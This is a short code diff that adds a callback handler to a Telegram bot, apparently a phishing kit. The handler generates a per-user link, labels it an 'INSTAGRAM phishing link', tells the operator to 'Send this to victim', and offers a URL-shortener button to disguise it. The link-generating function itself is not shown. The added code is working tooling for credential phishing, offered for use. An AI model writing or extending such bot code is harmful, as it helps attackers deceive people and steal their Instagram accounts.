@@ -25,3 +25,22 @@ def handle_insta_button(bot, message, get_bottom_buttons):
         reply_markup=markup,
         parse_mode="Markdown"
     )
+
+# ========== ADD THIS FUNCTION ==========
+def handle_insta_callback(bot, call):
+    user_id = call.message.chat.id
+    link = generate_link(user_id)
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🔗 Open Link", url=link),
+        InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
+        InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
+        InlineKeyboardButton("⬅ Back", callback_data="back")
+    )
+    bot.edit_message_text(
+        f"✅ *INSTAGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
+        chat_id=user_id,
+        message_id=call.message.message_id,
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
